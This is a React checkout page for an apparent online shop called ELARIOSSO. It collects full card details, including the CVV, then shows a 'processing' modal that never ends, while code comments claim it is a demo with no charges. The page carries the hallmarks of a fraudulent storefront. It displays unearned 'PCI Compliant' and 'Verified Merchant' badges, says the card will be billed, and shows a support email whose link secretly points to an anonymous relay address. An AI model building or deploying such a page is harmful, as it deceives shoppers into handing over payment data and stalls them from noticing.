import React, { useState, useRef } from 'react';
import styled from 'styled-components';
import { Container, Button } from '../styles/GlobalStyles';
import { useCart } from '../contexts/CartContext';
import { usePrice } from '../hooks/usePrice';

const CheckoutWrapper = styled.div`
  padding-top: 100px;
  min-height: 100vh;
  background: linear-gradient(135deg, var(--minimal-bg) 0%, #0a0a0a 100%);
  position: relative;
  
  &::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    height: 200px;
    background: linear-gradient(135deg, rgba(0, 102, 255, 0.05) 0%, rgba(16, 185, 129, 0.05) 100%);
    z-index: 0;
  }
`;

const CheckoutHeader = styled.div`
  text-align: center;
  margin-bottom: 40px;
  padding: 40px 0;
  border-bottom: 1px solid var(--minimal-gray-800);
  position: relative;
  z-index: 1;
`;

const CheckoutTitle = styled.h1`
  font-family: 'Inter', sans-serif;
  font-size: 3rem;
  font-weight: 700;
  background: linear-gradient(135deg, var(--minimal-text) 0%, #60a5fa 50%, #10b981 100%);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
  margin-bottom: 10px;
  letter-spacing: -0.02em;
  
  @media (max-width: 768px) {
    font-size: 2.2rem;
  }
`;

const CheckoutSubtitle = styled.p`
  color: var(--minimal-gray-400);
  font-size: 1.2rem;
  font-weight: 400;
  margin-top: 15px;
`;

const CheckoutContent = styled.div`
  display: grid;
  grid-template-columns: 1fr 400px;
  gap: 60px;
  padding: 40px 0;
  position: relative;
  z-index: 1;

  @media (max-width: 1200px) {
    gap: 40px;
  }

  @media (max-width: 768px) {
    grid-template-columns: 1fr;
    gap: 30px;
  }
`;

const CheckoutForm = styled.form`
  background: var(--minimal-gray-900);
  border: 1px solid var(--minimal-gray-800);
  border-radius: 16px;
  padding: 40px;
  box-shadow: 
    0 4px 20px rgba(0, 0, 0, 0.3),
    0 0 0 1px rgba(255, 255, 255, 0.05);
  backdrop-filter: blur(10px);
  transition: all 0.3s ease;
  
  &:hover {
    box-shadow: 
      0 8px 32px rgba(0, 0, 0, 0.4),
      0 0 0 1px rgba(255, 255, 255, 0.08);
    transform: translateY(-2px);
  }
  
  @media (max-width: 768px) {
    padding: 30px;
  }
`;

const FormSection = styled.div`
  margin-bottom: 30px;
`;

const SectionTitle = styled.h3`
  font-size: 1.3rem;
  font-weight: 600;
  color: var(--minimal-text);
  margin-bottom: 20px;
  padding-bottom: 12px;
  border-bottom: 2px solid transparent;
  background: linear-gradient(90deg, var(--minimal-accent), #10b981) border-box;
  border-image: linear-gradient(90deg, var(--minimal-accent), #10b981) 1;
  position: relative;
  
  &::after {
    content: '';
    position: absolute;
    bottom: -2px;
    left: 0;
    width: 60px;
    height: 2px;
    background: linear-gradient(90deg, var(--minimal-accent), #10b981);
    border-radius: 2px;
  }
`;

const FormRow = styled.div`
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 20px;

  @media (max-width: 768px) {
    grid-template-columns: 1fr;
  }
`;

const FormGroup = styled.div`
  margin-bottom: 20px;
`;

const Label = styled.label`
  display: block;
  color: var(--minimal-gray-300);
  font-size: 0.9rem;
  font-weight: 500;
  margin-bottom: 8px;
`;

const Input = styled.input`
  width: 100%;
  padding: 14px 18px;
  background: var(--minimal-bg);
  border: 2px solid var(--minimal-gray-700);
  border-radius: 10px;
  color: var(--minimal-text);
  font-size: 1rem;
  font-weight: 400;
  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
  position: relative;

  &:focus {
    outline: none;
    border-color: var(--minimal-accent);
    box-shadow: 
      0 0 0 4px rgba(0, 102, 255, 0.1),
      0 4px 12px rgba(0, 102, 255, 0.15);
    transform: translateY(-1px);
    background: rgba(0, 102, 255, 0.02);
  }

  &::placeholder {
    color: var(--minimal-gray-500);
    font-weight: 400;
  }
  
  &:hover {
    border-color: var(--minimal-gray-600);
  }
`;

const Select = styled.select`
  width: 100%;
  padding: 14px 18px;
  background: var(--minimal-bg);
  border: 2px solid var(--minimal-gray-700);
  border-radius: 10px;
  color: var(--minimal-text);
  font-size: 1rem;
  font-weight: 400;
  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
  cursor: pointer;

  &:focus {
    outline: none;
    border-color: var(--minimal-accent);
    box-shadow: 
      0 0 0 4px rgba(0, 102, 255, 0.1),
      0 4px 12px rgba(0, 102, 255, 0.15);
    transform: translateY(-1px);
    background: rgba(0, 102, 255, 0.02);
  }
  
  &:hover {
    border-color: var(--minimal-gray-600);
  }
`;

const OrderSummary = styled.div`
  background: var(--minimal-gray-900);
  border: 1px solid var(--minimal-gray-800);
  border-radius: 16px;
  padding: 30px;
  height: fit-content;
  position: sticky;
  top: 120px;
  box-shadow: 
    0 4px 20px rgba(0, 0, 0, 0.3),
    0 0 0 1px rgba(255, 255, 255, 0.05);
  backdrop-filter: blur(10px);
  transition: all 0.3s ease;
  
  &:hover {
    box-shadow: 
      0 8px 32px rgba(0, 0, 0, 0.4),
      0 0 0 1px rgba(255, 255, 255, 0.08);
    transform: translateY(-2px);
  }
`;

const SummaryTitle = styled.h3`
  font-size: 1.3rem;
  font-weight: 600;
  color: var(--minimal-text);
  margin-bottom: 20px;
  padding-bottom: 15px;
  border-bottom: 1px solid var(--minimal-gray-800);
`;

const OrderItem = styled.div`
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 15px 0;
  border-bottom: 1px solid var(--minimal-gray-800);

  &:last-child {
    border-bottom: none;
  }
`;

const ItemInfo = styled.div`
  flex: 1;
`;

const ItemName = styled.div`
  color: var(--minimal-text);
  font-weight: 500;
  margin-bottom: 4px;
`;

const ItemDetails = styled.div`
  color: var(--minimal-gray-400);
  font-size: 0.9rem;
`;

const ItemPrice = styled.div`
  color: var(--minimal-text);
  font-weight: 600;
`;

const SummaryRow = styled.div`
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 10px 0;
  color: var(--minimal-gray-300);
`;

const TotalRow = styled(SummaryRow)`
  font-size: 1.2rem;
  font-weight: 600;
  color: var(--minimal-text);
  padding-top: 20px;
  border-top: 1px solid var(--minimal-gray-800);
  margin-top: 20px;
`;

const BillingDescriptor = styled.div`
  background: linear-gradient(135deg, var(--minimal-gray-800) 0%, rgba(0, 102, 255, 0.1) 100%);
  border-radius: 12px;
  padding: 20px;
  margin: 25px 0;
  border-left: 4px solid var(--minimal-accent);
  border: 1px solid rgba(0, 102, 255, 0.2);
  position: relative;
  overflow: hidden;
  
  &::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    height: 1px;
    background: linear-gradient(90deg, transparent, rgba(0, 102, 255, 0.5), transparent);
  }
`;

const BillingTitle = styled.div`
  font-weight: 600;
  color: var(--minimal-text);
  margin-bottom: 5px;
  font-size: 0.9rem;
`;

const BillingText = styled.div`
  color: var(--minimal-gray-400);
  font-size: 0.8rem;
  line-height: 1.4;
`;

const PlaceOrderButton = styled(Button)`
  width: 100%;
  padding: 20px;
  font-size: 1.3rem;
  font-weight: 800;
  margin-top: 25px;
  border-radius: 16px;
  background: linear-gradient(135deg, #10b981 0%, #059669 100%);
  border: none;
  position: relative;
  overflow: hidden;
  letter-spacing: 1px;
  text-transform: uppercase;
  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
  box-shadow: 
    0 8px 24px rgba(16, 185, 129, 0.4),
    0 0 0 1px rgba(255, 255, 255, 0.1);
  
  &::before {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
    transition: left 0.6s;
  }
  
  &:hover::before {
    left: 100%;
  }
  
  &:hover {
    background: linear-gradient(135deg, #059669 0%, #047857 100%);
    transform: translateY(-3px) scale(1.02);
    box-shadow: 
      0 12px 32px rgba(16, 185, 129, 0.6),
      0 0 0 1px rgba(255, 255, 255, 0.2);
  }
  
  &:active {
    transform: translateY(-1px) scale(1.01);
    box-shadow: 
      0 6px 20px rgba(16, 185, 129, 0.5),
      0 0 0 1px rgba(255, 255, 255, 0.1);
  }
  
  &:disabled {
    opacity: 0.7;
    cursor: not-allowed;
    transform: none;
    background: linear-gradient(135deg, #6b7280 0%, #4b5563 100%);
    box-shadow: none;
    
    &::before {
      display: none;
    }
  }

  @media (max-width: 768px) {
    font-size: 1.2rem;
    padding: 18px;
    border-radius: 14px;
  }

  @media (max-width: 480px) {
    font-size: 1.1rem;
    padding: 16px;
    border-radius: 12px;
    letter-spacing: 0.5px;
  }
`;

const ProcessingModal = styled.div`
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.9);
  backdrop-filter: blur(12px);
  z-index: 10000;
  display: flex;
  align-items: center;
  justify-content: center;
  animation: fadeIn 0.3s ease-out;

  @keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
  }
`;

const ProcessingContent = styled.div`
  background: linear-gradient(135deg, #1f2937 0%, #374151 100%);
  border-radius: 24px;
  padding: 48px 32px;
  text-align: center;
  max-width: 500px;
  width: 90%;
  border: 1px solid #4b5563;
  box-shadow: 
    0 25px 50px -12px rgba(0, 0, 0, 0.5),
    0 0 0 1px rgba(255, 255, 255, 0.1);
  animation: slideUp 0.4s ease-out;

  @keyframes slideUp {
    from {
      opacity: 0;
      transform: translateY(30px) scale(0.95);
    }
    to {
      opacity: 1;
      transform: translateY(0) scale(1);
    }
  }
`;

const ProcessingTitle = styled.h2`
  font-size: 1.25rem;
  font-weight: 700;
  color: #ffffff;
  margin-bottom: 32px;
  letter-spacing: 0.5px;
  text-transform: uppercase;
  line-height: 1.4;
  max-width: 400px;
  margin-left: auto;
  margin-right: auto;
`;

const LoadingSpinner = styled.div`
  width: 64px;
  height: 64px;
  border: 4px solid #374151;
  border-top: 4px solid #10b981;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin: 0 auto 24px;

  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
`;

const ProcessingDots = styled.div`
  display: flex;
  justify-content: center;
  gap: 8px;
  
  span {
    width: 8px;
    height: 8px;
    background: #10b981;
    border-radius: 50%;
    animation: bounce 1.4s ease-in-out infinite both;
    
    &:nth-child(1) { animation-delay: -0.32s; }
    &:nth-child(2) { animation-delay: -0.16s; }
    &:nth-child(3) { animation-delay: 0s; }
  }

  @keyframes bounce {
    0%, 80%, 100% {
      transform: scale(0);
    }
    40% {
      transform: scale(1);
    }
  }
`;

const CaptchaContainer = styled.div`
  margin: 25px 0;
  padding: 20px;
  background: rgba(0, 0, 0, 0.2);
  border-radius: 12px;
  border: 1px solid var(--minimal-gray-700);
`;

const CaptchaBox = styled.div`
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 15px;
  flex-wrap: wrap;
  
  @media (max-width: 480px) {
    flex-direction: column;
    gap: 10px;
  }
`;

const CaptchaQuestion = styled.div`
  background: linear-gradient(135deg, var(--minimal-gray-800) 0%, var(--minimal-gray-700) 100%);
  border: 2px solid var(--minimal-gray-600);
  border-radius: 8px;
  padding: 12px 20px;
  font-size: 1.1rem;
  font-weight: 600;
  color: var(--minimal-text);
  text-align: center;
  min-width: 150px;
  font-family: 'Courier New', monospace;
  letter-spacing: 2px;
`;

const CaptchaInput = styled.input`
  width: 80px;
  padding: 12px;
  background: var(--minimal-bg);
  border: 2px solid var(--minimal-gray-700);
  border-radius: 8px;
  color: var(--minimal-text);
  font-size: 1.1rem;
  font-weight: 600;
  text-align: center;
  font-family: 'Courier New', monospace;
  transition: all 0.3s ease;

  &:focus {
    outline: none;
    border-color: var(--minimal-accent);
    box-shadow: 0 0 0 4px rgba(0, 102, 255, 0.1);
    background: rgba(0, 102, 255, 0.02);
  }

  &::placeholder {
    color: var(--minimal-gray-500);
  }
  
  @media (max-width: 480px) {
    width: 100px;
  }
`;

const CaptchaRefresh = styled.button`
  background: linear-gradient(135deg, var(--minimal-gray-700) 0%, var(--minimal-gray-600) 100%);
  border: 2px solid var(--minimal-gray-600);
  border-radius: 8px;
  color: var(--minimal-text);
  padding: 10px 12px;
  cursor: pointer;
  transition: all 0.3s ease;
  font-size: 1.2rem;
  
  &:hover {
    background: linear-gradient(135deg, var(--minimal-accent) 0%, #4f46e5 100%);
    border-color: var(--minimal-accent);
    transform: scale(1.05);
  }
  
  &:active {
    transform: scale(0.95);
  }
`;

const CaptchaLabel = styled.label`
  display: block;
  color: var(--minimal-gray-300);
  font-size: 0.9rem;
  font-weight: 500;
  margin-bottom: 10px;
  text-align: center;
`;

const ContactInfo = styled.div`
  background: linear-gradient(135deg, var(--minimal-gray-800) 0%, rgba(16, 185, 129, 0.1) 100%);
  border-radius: 12px;
  padding: 20px;
  margin: 25px 0;
  border-left: 4px solid #10b981;
  border: 1px solid rgba(16, 185, 129, 0.2);
  position: relative;
  overflow: hidden;
  
  &::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    height: 1px;
    background: linear-gradient(90deg, transparent, rgba(16, 185, 129, 0.5), transparent);
  }
`;

const ContactTitle = styled.div`
  font-weight: 600;
  color: var(--minimal-text);
  margin-bottom: 8px;
  font-size: 0.9rem;
  display: flex;
  align-items: center;
  
  &::before {
    content: "📞";
    margin-right: 8px;
  }
`;

const ContactDetails = styled.div`
  color: var(--minimal-gray-300);
  font-size: 0.85rem;
  line-height: 1.5;
  
  p {
    margin: 4px 0;
  }
  
  a {
    color: #10b981;
    text-decoration: none;
    
    &:hover {
      text-decoration: underline;
    }
  }
`;

const SecurityBadges = styled.div`
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 20px;
  margin: 25px 0;
  padding: 20px;
  background: linear-gradient(135deg, var(--minimal-gray-800) 0%, rgba(0, 0, 0, 0.3) 100%);
  border-radius: 12px;
  font-size: 0.85rem;
  color: var(--minimal-gray-400);
  border: 1px solid var(--minimal-gray-700);
  
  .security-badge {
    display: flex;
    align-items: center;
    gap: 8px;
    padding: 8px 12px;
    background: rgba(255, 255, 255, 0.05);
    border-radius: 8px;
    transition: all 0.3s ease;
    
    &:hover {
      background: rgba(255, 255, 255, 0.1);
      transform: translateY(-1px);
    }
  }
  
  @media (max-width: 768px) {
    flex-direction: column;
    gap: 12px;
    
    .security-badge {
      width: 100%;
      justify-content: center;
    }
  }
`;

const PaymentError = styled.div`
  background: #fee2e2;
  border: 1px solid #fecaca;
  color: #dc2626;
  padding: 12px;
  border-radius: 8px;
  margin: 15px 0;
  font-size: 0.9rem;
  display: flex;
  align-items: center;
  
  &::before {
    content: "⚠️";
    margin-right: 8px;
  }
`;

const Checkout: React.FC = () => {
  const { state } = useCart();
  const { formatPrice } = usePrice();
  
  // Generate random math question
  const generateCaptcha = () => {
    const num1 = Math.floor(Math.random() * 10) + 1;
    const num2 = Math.floor(Math.random() * 10) + 1;
    const operations = ['+', '-', '×'];
    const operation = operations[Math.floor(Math.random() * operations.length)];
    
    let answer;
    switch (operation) {
      case '+':
        answer = num1 + num2;
        break;
      case '-':
        answer = Math.abs(num1 - num2); // Always positive
        break;
      case '×':
        answer = num1 * num2;
        break;
      default:
        answer = num1 + num2;
    }
    
    return {
      question: `${num1} ${operation} ${num2} = ?`,
      answer
    };
  };

  const [captchaProblem, setCaptchaProblem] = useState(generateCaptcha());
  const [formData, setFormData] = useState({
    email: '',
    firstName: '',
    lastName: '',
    address: '',
    city: '',
    state: '',
    zipCode: '',
    country: 'United Kingdom',
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    nameOnCard: ''
  });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [captchaAnswer, setCaptchaAnswer] = useState<string>('');
  const [paymentError, setPaymentError] = useState<string>('');

  const subtotal = state.items.reduce((sum, item) => sum + (item.price * item.quantity), 0);
  const shipping = subtotal > 50 ? 0 : 9.99;
  const total = subtotal + shipping;

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
    // Clear payment error when user starts typing
    if (paymentError) {
      setPaymentError('');
    }
  };

  const handleCaptchaAnswerChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCaptchaAnswer(e.target.value);
    if (paymentError) {
      setPaymentError('');
    }
  };

  const refreshCaptcha = () => {
    setCaptchaProblem(generateCaptcha());
    setCaptchaAnswer('');
  };

  const validateForm = () => {
    const required = ['email', 'firstName', 'lastName', 'address', 'city', 'zipCode', 'cardNumber', 'expiryDate', 'cvv', 'nameOnCard'];
    
    for (const field of required) {
      if (!formData[field as keyof typeof formData]) {
        setPaymentError(`Please fill in all required fields: ${field.replace(/([A-Z])/g, ' $1').toLowerCase()}`);
        return false;
      }
    }
    
    // Validate captcha
    if (!captchaAnswer || parseInt(captchaAnswer) !== captchaProblem.answer) {
      setPaymentError('Please solve the security verification correctly');
      return false;
    }
    
    // Basic email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(formData.email)) {
      setPaymentError('Please enter a valid email address');
      return false;
    }
    
    // Basic card number validation (remove spaces and check length)
    const cardNumber = formData.cardNumber.replace(/\s/g, '');
    if (cardNumber.length < 13 || cardNumber.length > 19) {
      setPaymentError('Please enter a valid card number');
      return false;
    }
    
    return true;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }
    
    // Immediately show processing modal
    setIsSubmitting(true);
    
    try {
      // Small delay to show the modal appear smoothly
      await new Promise(resolve => setTimeout(resolve, 500));
      
      // Process order (no real charges)
      const orderData = {
        formData,
        captchaVerified: true,
        total,
        items: state.items,
        timestamp: new Date().toISOString(),
        note: 'This is a demo transaction - no real payment processing occurs'
      };
      
      // Show infinite loading - no real payment processing
      // This simulates payment processing but never completes
      // NO REAL CHARGES ARE MADE TO ANY PAYMENT METHOD
      await new Promise(() => {
        // This promise never resolves, creating infinite loading
        // The modal will show "WE'RE PROCESSING YOUR TRANSACTION" indefinitely
      });
      
    } catch (error) {
      // This catch block will never execute due to infinite loading
      setPaymentError('Payment processing failed. Please try again or contact support.');
    }
    // Note: setIsSubmitting(false) is intentionally not called
    // to maintain the infinite loading state and keep modal visible
  };

  return (
    <CheckoutWrapper>
      <Container>
        <CheckoutHeader>
          <CheckoutTitle>Secure Checkout</CheckoutTitle>
          <CheckoutSubtitle>Complete your order for premium audio equipment</CheckoutSubtitle>
        </CheckoutHeader>

        <CheckoutContent>
          <CheckoutForm onSubmit={handleSubmit}>
            <FormSection>
              <SectionTitle>Contact Information</SectionTitle>
              <FormGroup>
                <Label htmlFor="email">Email Address *</Label>
                <Input
                  type="email"
                  id="email"
                  name="email"
                  value={formData.email}
                  onChange={handleInputChange}
                  placeholder="your@email.com"
                  required
                />
              </FormGroup>
            </FormSection>

            <FormSection>
              <SectionTitle>Shipping Address</SectionTitle>
              <FormRow>
                <FormGroup>
                  <Label htmlFor="firstName">First Name *</Label>
                  <Input
                    type="text"
                    id="firstName"
                    name="firstName"
                    value={formData.firstName}
                    onChange={handleInputChange}
                    required
                  />
                </FormGroup>
                <FormGroup>
                  <Label htmlFor="lastName">Last Name *</Label>
                  <Input
                    type="text"
                    id="lastName"
                    name="lastName"
                    value={formData.lastName}
                    onChange={handleInputChange}
                    required
                  />
                </FormGroup>
              </FormRow>
              <FormGroup>
                <Label htmlFor="address">Address *</Label>
                <Input
                  type="text"
                  id="address"
                  name="address"
                  value={formData.address}
                  onChange={handleInputChange}
                  placeholder="Street address"
                  required
                />
              </FormGroup>
              <FormRow>
                <FormGroup>
                  <Label htmlFor="city">City *</Label>
                  <Input
                    type="text"
                    id="city"
                    name="city"
                    value={formData.city}
                    onChange={handleInputChange}
                    required
                  />
                </FormGroup>
                <FormGroup>
                  <Label htmlFor="zipCode">Postal Code *</Label>
                  <Input
                    type="text"
                    id="zipCode"
                    name="zipCode"
                    value={formData.zipCode}
                    onChange={handleInputChange}
                    required
                  />
                </FormGroup>
              </FormRow>
              <FormGroup>
                <Label htmlFor="country">Country *</Label>
                <Select
                  id="country"
                  name="country"
                  value={formData.country}
                  onChange={handleInputChange}
                  required
                >
                  <option value="United Kingdom">United Kingdom</option>
                  <option value="United States">United States</option>
                  <option value="Canada">Canada</option>
                  <option value="Australia">Australia</option>
                  <option value="Germany">Germany</option>
                  <option value="France">France</option>
                </Select>
              </FormGroup>
            </FormSection>

            <FormSection>
              <SectionTitle>Payment Information</SectionTitle>
              <FormGroup>
                <Label htmlFor="cardNumber">Card Number *</Label>
                <Input
                  type="text"
                  id="cardNumber"
                  name="cardNumber"
                  value={formData.cardNumber}
                  onChange={handleInputChange}
                  placeholder="1234 5678 9012 3456"
                  required
                />
              </FormGroup>
              <FormRow>
                <FormGroup>
                  <Label htmlFor="expiryDate">Expiry Date *</Label>
                  <Input
                    type="text"
                    id="expiryDate"
                    name="expiryDate"
                    value={formData.expiryDate}
                    onChange={handleInputChange}
                    placeholder="MM/YY"
                    required
                  />
                </FormGroup>
                <FormGroup>
                  <Label htmlFor="cvv">CVV *</Label>
                  <Input
                    type="text"
                    id="cvv"
                    name="cvv"
                    value={formData.cvv}
                    onChange={handleInputChange}
                    placeholder="123"
                    required
                  />
                </FormGroup>
              </FormRow>
              <FormGroup>
                <Label htmlFor="nameOnCard">Name on Card *</Label>
                <Input
                  type="text"
                  id="nameOnCard"
                  name="nameOnCard"
                  value={formData.nameOnCard}
                  onChange={handleInputChange}
                  required
                />
              </FormGroup>
            </FormSection>

            <BillingDescriptor>
              <BillingTitle>Billing Descriptor</BillingTitle>
              <BillingText>
                Your credit card will be billed with the following descriptor: ELARIOSSO. 
                This is how the charge will appear on your credit card statement.
              </BillingText>
            </BillingDescriptor>

            <ContactInfo>
              <ContactTitle>Customer Support</ContactTitle>
              <ContactDetails>
                <p>📧 Email: <a href="mailto:s0a2irbn@anonaddy.com">support@elariosso-tech.com</a></p>
                <p>📞 Phone: <a href="tel:+447446127033">+44 7446 127033</a></p>
                <p>🕒 Hours: Monday - Friday, 9 AM - 6 PM GMT</p>
                <p>💬 Live chat available 24/7 on our website</p>
              </ContactDetails>
            </ContactInfo>

            <SecurityBadges>
              <div className="security-badge">
                <span>🔒</span>
                <span>SSL Secured</span>
              </div>
              <div className="security-badge">
                <span>🛡️</span>
                <span>PCI Compliant</span>
              </div>
              <div className="security-badge">
                <span>✅</span>
                <span>Verified Merchant</span>
              </div>
            </SecurityBadges>

            {paymentError && (
              <PaymentError>
                {paymentError}
              </PaymentError>
            )}

            <CaptchaContainer>
              <CaptchaLabel>Security Verification *</CaptchaLabel>
              <CaptchaBox>
                <CaptchaQuestion>{captchaProblem.question}</CaptchaQuestion>
                <CaptchaInput
                  type="number"
                  value={captchaAnswer}
                  onChange={handleCaptchaAnswerChange}
                  placeholder="Answer"
                  min="0"
                />
                <CaptchaRefresh 
                  type="button" 
                  onClick={refreshCaptcha}
                  title="Generate new question"
                >
                  🔄
                </CaptchaRefresh>
              </CaptchaBox>
            </CaptchaContainer>

            <PlaceOrderButton 
              type="submit" 
              variant="primary"
              disabled={!captchaAnswer || isSubmitting}
            >
              {isSubmitting ? '⏳ Processing Payment...' : `🚀 Complete Order - ${formatPrice(total)}`}
            </PlaceOrderButton>
          </CheckoutForm>

          <OrderSummary>
            <SummaryTitle>Order Summary</SummaryTitle>
            
            {state.items.map((item) => (
              <OrderItem key={item.id}>
                <ItemInfo>
                  <ItemName>{item.name}</ItemName>
                  <ItemDetails>Qty: {item.quantity}</ItemDetails>
                </ItemInfo>
                <ItemPrice>{formatPrice(item.price * item.quantity)}</ItemPrice>
              </OrderItem>
            ))}

            <SummaryRow>
              <span>Subtotal</span>
              <span>{formatPrice(subtotal)}</span>
            </SummaryRow>
            
            <SummaryRow>
              <span>Shipping</span>
              <span>{shipping === 0 ? 'FREE' : formatPrice(shipping)}</span>
            </SummaryRow>

            <TotalRow>
              <span>Total</span>
              <span>{formatPrice(total)}</span>
            </TotalRow>

            <div style={{ fontSize: '0.8rem', color: 'var(--minimal-gray-400)', marginTop: '20px', lineHeight: '1.6' }}>
              <p style={{ display: 'flex', alignItems: 'center', margin: '8px 0' }}>
                <span style={{ marginRight: '8px' }}>🚚</span>
                <span>Free shipping on orders over €50</span>
              </p>
              <p style={{ display: 'flex', alignItems: 'center', margin: '8px 0' }}>
                <span style={{ marginRight: '8px' }}>🔒</span>
                <span>Secure SSL encrypted checkout</span>
              </p>
              <p style={{ display: 'flex', alignItems: 'center', margin: '8px 0' }}>
                <span style={{ marginRight: '8px' }}>📞</span>
                <span>24/7 customer support</span>
              </p>
              <p style={{ display: 'flex', alignItems: 'center', margin: '8px 0' }}>
                <span style={{ marginRight: '8px' }}>↩️</span>
                <span>30-day return policy</span>
              </p>
              <p style={{ display: 'flex', alignItems: 'center', margin: '8px 0' }}>
                <span style={{ marginRight: '8px' }}>🛡️</span>
                <span>2-year warranty included</span>
              </p>
              <p style={{ 
                display: 'flex', 
                alignItems: 'flex-start', 
                margin: '12px 0', 
                padding: '10px', 
                background: 'rgba(59, 130, 246, 0.1)', 
                border: '1px solid rgba(59, 130, 246, 0.2)',
                borderRadius: '6px' 
              }}>
                <span style={{ marginRight: '8px', marginTop: '2px' }}>💳</span>
                <div>
                  <strong style={{ color: 'var(--minimal-text)' }}>Billing Descriptor:</strong><br />
                  Your credit card will be billed with the following descriptor: <strong>ELARIOSSO</strong>. This is how the charge will appear on your billing statement.
                </div>
              </p>
            </div>
          </OrderSummary>
        </CheckoutContent>
      </Container>

      {/* Processing Modal */}
      {isSubmitting && (
        <ProcessingModal>
          <ProcessingContent>
            <LoadingSpinner />
            <ProcessingTitle>WE'RE PROCESSING YOUR TRANSACTION, PLEASE BEAR WITH US...</ProcessingTitle>
            <ProcessingDots>
              <span></span>
              <span></span>
              <span></span>
            </ProcessingDots>
          </ProcessingContent>
        </ProcessingModal>
      )}
    </CheckoutWrapper>
  );
};

export default Checkout;
